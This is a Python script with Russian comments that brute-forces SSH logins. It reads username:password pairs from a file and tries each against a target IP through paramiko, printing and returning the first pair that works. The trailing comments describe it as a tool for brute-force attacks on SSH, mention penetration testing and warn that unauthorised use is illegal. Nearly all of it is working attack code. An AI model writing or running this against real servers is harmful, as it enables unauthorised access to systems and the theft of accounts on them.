import paramiko
from paramiko.ssh_exception import AuthenticationException, SSHException

def load_credentials_from_file(file_path):
    """
    Загружает пары логин/пароль из файла.
    Ожидается, что каждая строка файла имеет формат: username:password
    """
    credentials = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                # Удаляем пробелы и переносы строки
                line = line.strip()
                if ':' in line:
                    username, password = line.split(':', 1)
                    credentials.append((username.strip(), password.strip()))
    except Exception as e:
        print(f"Ошибка при загрузке файла {file_path}: {e}")
    return credentials

def check_ssh_login(ip, file_path, port=22):
    """
    Проверяет возможность входа по SSH с парами логин/пароль из указанного файла.
    """
    credentials = load_credentials_from_file(file_path)
    if not credentials:
        print("Список логинов и паролей пуст или файл не загружен.")
        return

    for username, password in credentials:
        try:
            # Создание SSH-клиента
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Попытка подключения с заданной парой логин/пароль
            ssh.connect(ip, port=port, username=username, password=password, timeout=5)
            print(f"Успешный вход: {username}/{password}")
            ssh.close()
            return f"Логин: {username}, Пароль: {password}"  # Завершение после успешного входа
        except AuthenticationException:
            print(f"Не удалось войти с {username}/{password}")
        except SSHException as e:
            print(f"Ошибка SSH при подключении к {ip}: {e}")
            break
        except Exception as e:
            print(f"Ошибка при подключении к {ip}: {e}")
            break


# Этот код реализует функцию для перебора логинов и паролей с целью проверки возможности подключения к серверу через SSH.  

# ### Основные компоненты:
# 1. **`load_credentials_from_file`**:
#    - Читает файл с парами логин/пароль, каждая строка имеет формат `username:password`.
#    - Возвращает список кортежей `(username, password)`.

# 2. **`check_ssh_login`**:
#    - Подключается к указанному IP-адресу через SSH с использованием пар логин/пароль из файла.
#    - Использует библиотеку `paramiko` для работы с SSH.
#    - Логика:
#      - Загружает список учетных данных.
#      - Перебирает каждую пару логин/пароль:
#        - При успешном подключении выводит логин/пароль и завершает работу.
#        - При неудачной попытке выводит сообщение об ошибке.
#        - Если возникает ошибка SSH или другая ошибка, прерывает цикл.

# ### Особенности:
# - Проверяет стандартный порт `22`, но порт можно задать явно через аргумент `port`.
# - Использует тайм-аут в 5 секунд для предотвращения длительного ожидания при недоступности сервера.
# - Обрабатывает исключения:
#   - `AuthenticationException` для неверных учетных данных.
#   - `SSHException` для ошибок в соединении SSH.
#   - Общие исключения для обработки других ошибок.

# ### Назначение:
# Код предназначен для выполнения **брутфорс-атак на SSH** с использованием заранее подготовленного файла учетных данных. Он может быть использован для проверки безопасности серверов (например, в рамках тестирования на проникновение). 

# **Важно**: Использование этого кода без разрешения владельца сервера нарушает законы в большинстве стран.